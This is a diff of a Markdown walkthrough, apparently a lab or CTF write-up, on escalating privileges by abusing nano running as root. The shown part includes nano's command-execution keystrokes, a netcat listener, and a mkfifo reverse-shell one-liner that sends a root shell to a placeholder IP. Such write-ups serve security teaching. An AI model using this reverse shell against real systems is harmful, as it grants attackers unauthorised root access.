@@ -141,11 +141,11 @@ So basically if you have nano run as root, you can do anything, because nano has
 So press CTRL + R and then CTRL + X in nano's UI, this will allow us to execute programs, as root because nano is run as root
 <img src = "cmd.png"> 
 <br>
-I want to get a more stable shell, so i open a netcat session
+I want to get a more stable shell, so i open a netcat session in a different shell
 ```
 $ ncat -nlvp 8002
 ```
-So now execute this code in the prompt nano gave us:
+And then execute this code in the prompt nano gave us:
 ```
 rm /tmp/f; mkfifo /tmp/f; nc <your_ip> 8002 < /tmp/f | /bin/sh >/tmp/f 2>&1
 ```
